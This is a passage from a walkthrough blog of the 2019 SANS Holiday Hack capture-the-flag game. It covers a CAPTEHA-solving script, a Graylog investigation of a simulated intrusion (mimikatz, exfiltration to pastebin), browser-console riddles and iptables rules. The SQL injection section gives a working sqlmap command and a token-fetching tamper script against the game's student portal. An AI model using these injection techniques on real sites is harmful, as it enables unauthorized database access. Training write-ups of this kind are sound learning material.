class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">yourREALemailAddress</span> <span class="o">=</span> <span class="s">"dwatts.comptech@gmail.com"</span>

    <span class="c1"># Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory
</span>    <span class="n">graph</span> <span class="o">=</span> <span class="n">load_graph</span><span class="p">(</span><span class="s">'/tmp/retrain_tmp/output_graph.pb'</span><span class="p">)</span>
    <span class="n">labels</span> <span class="o">=</span> <span class="n">load_labels</span><span class="p">(</span><span class="s">"/tmp/retrain_tmp/output_labels.txt"</span><span class="p">)</span>

    <span class="c1"># Load up our session
</span>    <span class="n">input_operation</span> <span class="o">=</span> <span class="n">graph</span><span class="p">.</span><span class="n">get_operation_by_name</span><span class="p">(</span><span class="s">"import/Placeholder"</span><span class="p">)</span>
    <span class="n">output_operation</span> <span class="o">=</span> <span class="n">graph</span><span class="p">.</span><span class="n">get_operation_by_name</span><span class="p">(</span><span class="s">"import/final_result"</span><span class="p">)</span>
    <span class="n">sess</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">compat</span><span class="p">.</span><span class="n">v1</span><span class="p">.</span><span class="n">Session</span><span class="p">(</span><span class="n">graph</span><span class="o">=</span><span class="n">graph</span><span class="p">)</span>

    <span class="c1"># Can use queues and threading to spead up the processing
</span>    <span class="n">q</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>
    
    <span class="c1"># Creating a session to handle cookies
</span>    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">"https://fridosleigh.com/"</span>

    <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"{}api/capteha/request"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">url</span><span class="p">)).</span><span class="n">text</span><span class="p">)</span>
    <span class="n">unknown_images</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s">'images'</span><span class="p">]</span>                    <span class="c1"># A list of dictionaries eaching containing the keys 'base64' and 'uuid'
</span>    <span class="n">challenge_image_type</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s">'select_type'</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>     <span class="c1"># The Image types the CAPTEHA Challenge is looking for.
</span>    <span class="n">challenge_image_types</span> <span class="o">=</span> <span class="p">[</span><span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">' and '</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">strip</span><span class="p">()]</span> <span class="c1"># cleaning and formatting
</span>
    <span class="c1">#Going to interate over each of our images.
</span>    <span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">unknown_images</span><span class="p">:</span>
        <span class="n">image_bytes</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">image</span><span class="p">[</span><span class="s">'base64'</span><span class="p">])</span>
        <span class="n">image_uuid</span> <span class="o">=</span> <span class="n">image</span><span class="p">[</span><span class="s">'uuid'</span><span class="p">]</span>

        <span class="c1"># We don't want to process too many images at once. 10 threads max
</span>        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">threading</span><span class="p">.</span><span class="nb">enumerate</span><span class="p">())</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
            <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.0001</span><span class="p">)</span>

        <span class="c1">#predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object
</span>        <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">predict_image</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">sess</span><span class="p">,</span> <span class="n">graph</span><span class="p">,</span> <span class="n">image_bytes</span><span class="p">,</span> <span class="n">image_uuid</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">input_operation</span><span class="p">,</span> <span class="n">output_operation</span><span class="p">)).</span><span class="n">start</span><span class="p">()</span>
    
    <span class="k">print</span><span class="p">(</span><span class="s">'Waiting For Threads to Finish...'</span><span class="p">)</span>
    <span class="k">while</span> <span class="n">q</span><span class="p">.</span><span class="n">qsize</span><span class="p">()</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">unknown_images</span><span class="p">):</span>
        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.001</span><span class="p">)</span>
    
    <span class="c1">#getting a list of all threads returned results
</span>    <span class="n">prediction_results</span> <span class="o">=</span> <span class="p">[</span><span class="n">q</span><span class="p">.</span><span class="n">get</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">q</span><span class="p">.</span><span class="n">qsize</span><span class="p">())]</span>
    
    <span class="c1"># This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .
</span>    <span class="n">final_answer</span> <span class="o">=</span> <span class="s">','</span><span class="p">.</span><span class="n">join</span><span class="p">(</span> <span class="p">[</span> <span class="n">prediction</span><span class="p">[</span><span class="s">'image_uuid'</span><span class="p">]</span> <span class="k">for</span> <span class="n">prediction</span> <span class="ow">in</span> <span class="n">prediction_results</span> <span class="k">if</span> <span class="n">prediction</span><span class="p">[</span><span class="s">'prediction'</span><span class="p">]</span> <span class="ow">in</span> <span class="n">challenge_image_types</span> <span class="p">]</span> <span class="p">)</span>
</pre></table></code></div></div><p>After running the time-optimized code, you’ll win the contest and you’ll receive an email with the Objective solution inside.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>...
Submitting lots of entries until we win the contest! Entry #104
Submitting lots of entries until we win the contest! Entry #105
Submitting lots of entries until we win the contest! Entry #106
Submitting lots of entries until we win the contest! Entry #107
Submitting lots of entries until we win the contest! Entry #108
{"data":"&lt;h2 id=\"result_header\"&gt; Entries for email address #################### no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. &lt;br&gt;&lt;br&gt; Congratulations and Happy Holidays!&lt;/h2&gt;","request":true}
</pre></table></code></div></div><p><a href="/assets/img/2020/01/image-27.png"><img data-src="/assets/img/2020/01/image-27.png" data-proofer-ignore></a></p><h2 id="objective-9--retrieve-scraps-of-paper-from-server"><span class="mr-2">Objective 9 – Retrieve Scraps of Paper from Server</span><a href="#objective-9--retrieve-scraps-of-paper-from-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Gain access to the data on the <a href="https://studentportal.elfu.org/">Student Portal</a> server and retrieve the paper scraps hosted there. What is the name of Santa’s cutting-edge sleigh guidance system? _For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: Super Sled-o-matic</p></blockquote><p>The Elf University Student Portal is a site where you can submit an application for enrollment and check it’s status. To get a hint for the Student Portal, go to Pepper Minstix and do the Graylog Terminal Challenge.</p><h3 id="terminal-challenge--graylog"><span class="mr-2">Terminal Challenge – Graylog</span><a href="#terminal-challenge--graylog" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>This challenge is to analyze event data with Graylog and fill out all the questions in the Incident Report. Find the Report by mouse-over in the bottom right corner of the Graylog window.</p><p>To figure out what Event ID’s are in order to search on them, look up <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon EventID</a>.</p><h4 id="question1"><span class="mr-2">Question 1:</span><a href="#question1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.</p><p>What is the full-path + filename of the first malicious file downloaded by Minty?</p><h4 id="answer-1"><span class="mr-2">Answer 1:</span><a href="#answer-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> C:\Users\minty\Downloads\cookie_recipe.exe</p></blockquote><p>Search with the regular expression /.*cookie.*/ to get the answer. Be sure to search in all messages.</p><h4 id="question2"><span class="mr-2">Question 2:</span><a href="#question2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the <strong>ip:port</strong> the malicious file connected to first?</p><h4 id="answer-2"><span class="mr-2">Answer 2:</span><a href="#answer-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> 192.168.247.175:4444</p></blockquote><p>You could follow the events found from the first question in sequence, or you could search on the Network Connection EventID 3 and look at the first one with “/.*cookie.*/ AND EventID:3”</p><h4 id="question3"><span class="mr-2">Question 3:</span><a href="#question3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>What was the first command executed by the attacker?</p><h4 id="answer-3"><span class="mr-2">Answer 3:</span><a href="#answer-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> whoami</p></blockquote><p>Search within the cookie results for EventID:1 and look for commands being entered with “/.<em>cookie.</em>/ AND EventID:1″</p><h4 id="question4"><span class="mr-2">Question 4:</span><a href="#question4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>What is the one-word service name the attacker used to escalate privileges?</p><h4 id="answer-4"><span class="mr-2">Answer 4:</span><a href="#answer-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> webexservice</p></blockquote><p>Click on the “userAccount” in the field list to the left in order to quickly read what the user account is for the commands found previously. Most of the commands are under “minty”, and inspect what happens when they change to no longer showing a user.</p><h4 id="question5"><span class="mr-2">Question 5:</span><a href="#question5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>What is the file-path + filename of the binary ran by the attacker to dump credentials?</p><h4 id="answer-5"><span class="mr-2">Answer 5:</span><a href="#answer-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> C:\cookie.exe</p></blockquote><p>A fast way to inspect the commands is to use the field list on the left and click on the “CommandLine” box. Commands will then show above the details so you can quickly follow through what happened. Shortly above the privilege escalation there were calls to download “mimikatz.exe”, which is known for dumping credentials. The file is saved as “cookie.zip” first, and then again as “C:\cookie.exe”, which is then executed.</p><h4 id="question6"><span class="mr-2">Question 6:</span><a href="#question6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>The attacker pivoted to another workstation using credentials gained from Minty’s computer. Which account name was used to pivot to another machine?</p><h4 id="answer-6"><span class="mr-2">Answer 6:</span><a href="#answer-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> alabaster</p></blockquote><p>Pivot on time by going to the last event in the previous results, which has a command of <code class="language-plaintext highlighter-rouge">cmd \c exit</code>. Click on “Show surrounding messages” button and select 1 minute. Within these results search for network connections from the attacker’s address “192.168.247.175”. All four of them are using “alabaster” as the account.</p><h4 id="question7"><span class="mr-2">Question 7:</span><a href="#question7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?</p><h4 id="answer-7"><span class="mr-2">Answer 7:</span><a href="#answer-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> 06:04:28</p></blockquote><p>Look up <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-logon-events">logon events</a> and find the Remote Desktop Connection type. The logon type needed is 10, so search “LogonType:10” in all messages. Only one of the results has __a Windows Event ID <strong>4624</strong> , grab it’s time and that’s the answer.</p><h4 id="question8"><span class="mr-2">Question 8:</span><a href="#question8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the <strong>SourceHostName,DestinationHostname,LogonType</strong> of this connection?</p><h4 id="answer-8"><span class="mr-2">Answer 8:</span><a href="#answer-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> elfu-res-wks2,elfu-res-wks3,3</p></blockquote><p>Search for network logons with “EventID:4624 AND LogonType:3”, then look through the listing for connections from the computer “elfu-res-wks2”, where the RDP connection was on.</p><h4 id="question9"><span class="mr-2">Question 9:</span><a href="#question9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>What is the full-path + filename of the secret research document after being transferred from the third host to the second host?</p><h4 id="answer-9"><span class="mr-2">Answer 9:</span><a href="#answer-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</p></blockquote><p>Search for files created on the second computer with “EventID:2 AND source:elfu-res-wks2”. In the displayed field list, only select Message and TargetFilename in order to quickly see what was downloaded. Look through the listing and you’ll see an interesting PDF.</p><h4 id="question10"><span class="mr-2">Question 10:</span><a href="#question10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?</p><h4 id="answer-10"><span class="mr-2">Answer 10:</span><a href="#answer-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><blockquote class="wp-block-quote"><p> 104.22.3.84</p></blockquote><p>Search on the filename and you’ll see there was a command to upload it to “pastebin.com”. Show surrounding messages for just 1 second from that event, and you’ll see a network connection made to pastebin.com with the IP address listed.</p><h3 id="hint-2"><span class="mr-2">Hint</span><a href="#hint-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> That&#8217;s it &#8211; hooray!<br />Have you had any luck retrieving scraps of paper from the Elf U server?<br />You might want to look into SQL injection techniques.<br />OWASP is always a good resource for web attacks.<br />For blind SQLi, I&#8217;ve heard Sqlmap is a great tool.<br />In certain circumstances though, you need custom tamper scripts to get things going!</p><cite>Alabaster Snowball</cite></blockquote><p>His hint basically shows that you have to do SQL injection to solve this Objective. Alabaster also lets us know that tamper scripts with Sqlmap is useful for this.</p><h3 id="solution-4"><span class="mr-2">Solution</span><a href="#solution-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>There are two pages in the Student Portal that are vulnerable to SQL injection. The “Apply Now” page where you submit your application uses a POST request with several variables, and the “Check Application Status” page uses a simple GET request. Both pages are viable to solve the the Objective. I used the GET request since it won’t create new records in the database. Of course you have to create an application to check against or it’ll return “No application found”.</p><h4 id="sql-command"><span class="mr-2">SQL Command</span><a href="#sql-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=elfelif@nowhere.net*" --tamper="hhctamper.py" --skip-urlencode -v2 -o --prefix="'" --suffix=" -- " -D "elfu"
</pre></table></code></div></div><p>There is an authentication token that expires too quickly to use in a command like this, since you have to first generate the token with a request to “validator.php” and by the time you can type it into a sqlmap command it’s already expired. That’s where the hint about tamper scripts comes in. Use Sqlmap’s tamper script functionality and make a call to get the token before using the returned data in the call to “application-check.php”.</p><h4 id="tamper-script"><span class="mr-2">Tamper Script</span><a href="#tamper-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>#!/usr/bin/python

import base64
import urllib
import requests


def tamper(payload, **kwargs):
    token = requests.get("https://studentportal.elfu.org/validator.php").text
    data = payload + "&amp;token=" + token

    return data
</pre></table></code></div></div><h4 id="database"><span class="mr-2">Database</span><a href="#database" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>The database to dump is “elfu” and it has three user tables, “applications”, “students”, and “krampus”. The “applications” table is way too large to dump as it holds attempts from thousands of people at the convention, so skip dumping that one with Ctrl-C at the time. The “krampus” table is what holds the scraps of paper.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Table: krampus
 [6 entries]
 +----+-----------------------+
 | id | path                  |
 +----+-----------------------+
 | 1  | /krampus/0f5f510e.png |
 | 2  | /krampus/1cc7e121.png |
 | 3  | /krampus/439f15e6.png |
 | 4  | /krampus/667d6896.png |
 | 5  | /krampus/adb798ca.png |
 | 6  | /krampus/ba417715.png |
 +----+-----------------------+
</pre></table></code></div></div><h4 id="paper-scraps"><span class="mr-2">Paper Scraps</span><a href="#paper-scraps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>After you download all the images found, you’ll need to piece them together like a jigsaw puzzle and figure out what the original letter said. It could look something like this:</p><p><a href="/assets/img/2020/01/image-28.png"><img data-src="/assets/img/2020/01/image-28-890x1024.png" data-proofer-ignore></a></p><p>After you study it a little bit, you’ll piece out what the text says, where you’ll find the name of Santa’s sleigh guidance system to answer the Objective.</p><pre class="wp-block-preformatted">From the Desk of ---
Date: August 23, 2019
Memo to Self:

Finally! I've figured out how to destroy Christmas!
Santa has a brand new, cutting edge sleigh guidance
technology, call the Super Sled-o-matic.

I've figured out a way to poison the data going into the 
system so that it will divert Santa's sled on Christmas
Eve!

Santa will be unable to make the trip and the holiday
season will be destroyed! Santa's own technology will 
undermine him!

That's what they deserve for not listening to my
suggestions for supporting other holiday characters!

Bwahahahahaha!</pre><h2 id="objective-10--recover-cleartext-document"><span class="mr-2">Objective 10 – Recover Cleartext Document</span><a href="#objective-10--recover-cleartext-document" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>The <a href="https://downloads.elfu.org/elfscrow.exe">Elfscrow Crypto</a> tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can’t send you the source, but we do have <a href="https://downloads.elfu.org/elfscrow.pdb">debug symbols</a> that you can use.</p><p>Recover the plaintext content for this <a href="https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc">encrypted document</a>. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. </p><p>What is the middle line on the cover page? (Hint: it’s five words)</p><p>_For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: Machine Learning Sleigh Route Finder</p></blockquote><h2 id="objective-11--open-the-sleigh-shop-door"><span class="mr-2">Objective 11 – Open the Sleigh Shop Door</span><a href="#objective-11--open-the-sleigh-shop-door" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?<br /> For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: The Tooth Fairy</p></blockquote><p><img data-src="/assets/img/2020/01/image-31.png" data-proofer-ignore></p><p>For this Objective, you have to go to the Student Union and find the Sleigh Shop in the corner. An elf named Shinny Upatree stands there, and at this point in the game there will be a crate also. Shinny claims to have written down the name of the attacker and put it in this crate, but it’s only opened by solving his riddles.</p><blockquote class="wp-block-quote"><p> Psst &#8211; hey!<br />I&#8217;m Shinny Upatree, and I know what&#8217;s going on!<br />Yeah, that&#8217;s right &#8211; guarding the sleigh shop has made me privvy to some serious, high-level intel.<br />In fact, I know WHO is causing all the trouble.<br />Cindy? Oh no no, not that who. And stop guessing &#8211; you&#8217;ll never figure it out.<br />The only way you could would be if you could break into <a href="https://crate.elfu.org/">my crate</a>, here.<br />You see, I&#8217;ve written the villain&#8217;s name down on a piece of paper and hidden it away securely!</p><cite>Shinny Upatree</cite></blockquote><p><img data-src="/assets/img/2020/01/image-32.png" data-proofer-ignore></p><h3 id="riddle-1"><span class="mr-2">Riddle 1</span><a href="#riddle-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> You don&#8217;t need a clever riddle to open the console and scroll a little.</p></blockquote><p>Follow the instructions and open the developer’s console to see the unlock code. Then enter it into the lock image, and press “UNLOCK”. The light will turn red once that code is accepted.</p><p><a href="/assets/img/2020/01/image-33.png"><img data-src="/assets/img/2020/01/image-33-1024x737.png" data-proofer-ignore></a></p><h3 id="riddle-2"><span class="mr-2">Riddle 2</span><a href="#riddle-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> Some codes are hard to spy, perhaps they&#8217;ll show up on pulp with dye?</p></blockquote><p>This riddle is referring to print on paper, so look into the “Print Preview” to see the code.</p><p><a href="/assets/img/2020/01/image-34.png"><img data-src="/assets/img/2020/01/image-34.png" data-proofer-ignore></a></p><h3 id="riddle-3"><span class="mr-2">Riddle 3</span><a href="#riddle-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> This code is still unknown; it was fetched but never shown.</p></blockquote><p>Open Network in the Developer Tools and see what’s loaded but never shown. Might have to reload the page to capture the traffic.</p><p><a href="/assets/img/2020/01/image-35.png"><img data-src="/assets/img/2020/01/image-35-1024x737.png" data-proofer-ignore></a></p><h3 id="riddle-4"><span class="mr-2">Riddle 4</span><a href="#riddle-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> Where might we keep the things we forage? Yes, of course: Local barrels!</p></blockquote><p>Find this one in the Local Storage tab of Developer’s Console.</p><p><a href="/assets/img/2020/01/image-36.png"><img data-src="/assets/img/2020/01/image-36-1024x737.png" data-proofer-ignore></a></p><h3 id="riddle-5"><span class="mr-2">Riddle 5</span><a href="#riddle-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> Did you notice the code in the title? It may very well prove vital.</p></blockquote><p>Look at the title in the HTML Elements Tab.</p><p><a href="/assets/img/2020/01/image-37.png"><img data-src="/assets/img/2020/01/image-37-1024x737.png" data-proofer-ignore></a></p><h3 id="riddle-6"><span class="mr-2">Riddle 6</span><a href="#riddle-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> n order for this hologram to be effective, it may be necessary to increase your perspective.</p></blockquote><p>Delete the “perspective” CSS element.</p><p><a href="/assets/img/2020/01/image-38.png"><img data-src="/assets/img/2020/01/image-38-1024x737.png" data-proofer-ignore></a></p><p>Then you’ll see a code in the rainbow box. Type it in as shown.</p><p><a href="/assets/img/2020/01/image-39.png"><img data-src="/assets/img/2020/01/image-39-1024x393.png" data-proofer-ignore></a></p><h3 id="riddle-7"><span class="mr-2">Riddle 7</span><a href="#riddle-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> The font you&#8217;re seeing is pretty slick, but this lock&#8217;s code was my first pick.</p></blockquote><p>Find the font-family property in the HTML head.</p><p><a href="/assets/img/2020/01/image-40.png"><img data-src="/assets/img/2020/01/image-40-1024x737.png" data-proofer-ignore></a>&gt;</p><h3 id="riddle-8"><span class="mr-2">Riddle 8</span><a href="#riddle-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> In the event that the&nbsp;.eggs&nbsp;go bad, you must figure out who will be sad.</p></blockquote><p>Search for “eggs” in the HTML for an element with a class of “eggs”. Highlight the found element and look at its “Event Listeners”. There is a listener for “spoil” and the handler makes assigns ‘VERONICA = sad’. Type in VERONICA.</p><p><a href="/assets/img/2020/01/image-41.png"><img data-src="/assets/img/2020/01/image-41-1024x737.png" data-proofer-ignore></a></p><h3 id="riddle-9"><span class="mr-2">Riddle 9</span><a href="#riddle-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> This&nbsp;next&nbsp;code will be&nbsp;unredacted, but&nbsp;only&nbsp;when&nbsp;all the&nbsp;chakras&nbsp;are&nbsp;:active.</p></blockquote><p>Search for “chakra” in the HTML to find 5 words with the “chakra” class. Force each word to be in an “:active” state and sections of the code will appear. You can also just read the code sections in the CSS by searching for “chakra”.</p><p><a href="/assets/img/2020/01/image-42.png"><img data-src="/assets/img/2020/01/image-42-1024x737.png" data-proofer-ignore></a></p><h3 id="riddle-10"><span class="mr-2">Riddle 10</span><a href="#riddle-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> Oh, no! This lock&#8217;s out of commission! Pop off the cover and locate what&#8217;s missing.</p></blockquote><p>First, remove the cover image by modifying a CSS property for ‘cover’.</p><p><a href="/assets/img/2020/01/image-43.png"><img data-src="/assets/img/2020/01/image-43-1024x737.png" data-proofer-ignore></a></p><p>Next, you have to find three components that are defined in the CSS, and put them on the circuit board.</p><p><a href="/assets/img/2020/01/image-44.png"><img data-src="/assets/img/2020/01/image-44-1024x737.png" data-proofer-ignore></a></p><p>Discover where they are in the HTML by searching for “component”. You can then drag the HTML element down to the lock area. That will allow you to enter the code and push the button.</p><p><a href="/assets/img/2020/01/image-45.png"><img data-src="/assets/img/2020/01/image-45-1024x737.png" data-proofer-ignore></a></p><p>Find the lock’s code written on the circuit board.</p><p><a href="/assets/img/2020/01/image-46.png"><img data-src="/assets/img/2020/01/image-46.png" data-proofer-ignore></a></p><h3 id="the-note"><span class="mr-2">The Note</span><a href="#the-note" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>After solving entering the code in for all of the locks, the note will appear with the answer on it.</p><h3 id="terminal-challenge--smart-braces"><span class="mr-2">Terminal Challenge – Smart Braces</span><a href="#terminal-challenge--smart-braces" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote class="wp-block-quote"><p> OK, this is starting to freak me out!<br />Oh sorry, I&#8217;m Kent Tinseltooth. My Smart Braces are acting up.<br />Do… Do you ever get the feeling you can hear things? Like, voices?<br />I know, I sound crazy, but ever since I got these… Oh!<br />Do you think you could take a look at my Smart Braces terminal?<br />I&#8217;ll bet you can keep other students out of my head, so to speak.<br />It might just take a bit of Iptables work.</p><cite>Kent Tinseltooth</cite></blockquote><p>Opening this terminal slowly shows dialog text between Kent Tinseltooth and someone named “Inner Voice”.</p><p><a href="/assets/img/2020/01/image-47.png"><img data-src="/assets/img/2020/01/image-47.png" data-proofer-ignore></a></p><p>Read the file in the home directory, “IOTteethBraces.md” to find out what to do next. Due to questions about who the “Inner Voice” actually was, Kent wants to further secure the device by configuring the firewall to harden it.</p><p>There are 6 rules that need to be applied with “<a href="https://linux.die.net/man/8/iptables">iptables</a>“:</p><ol><li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.<li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.<li>Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).<li>Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.<li>Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.<li>Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.</ol><p>And here are commands to use for inputting them in relative order:</p><ol><li>elfuuser@25f4a0a345d9:~$ sudo iptables -P FORWARD DROP<br /> elfuuser@25f4a0a345d9:~$ sudo iptables -P OUTPUT DROP<br /> elfuuser@25f4a0a345d9:~$ sudo iptables -P INPUT DROP<li>sudo iptables -A INPUT -m conntrack –ctstate ESTABLISHED,RELATED -j ACCEPT<br /> sudo iptables -A OUTPUT -m conntrack –ctstate ESTABLISHED,RELATED -j ACCEPT<li>sudo iptables -A INPUT -p tcp 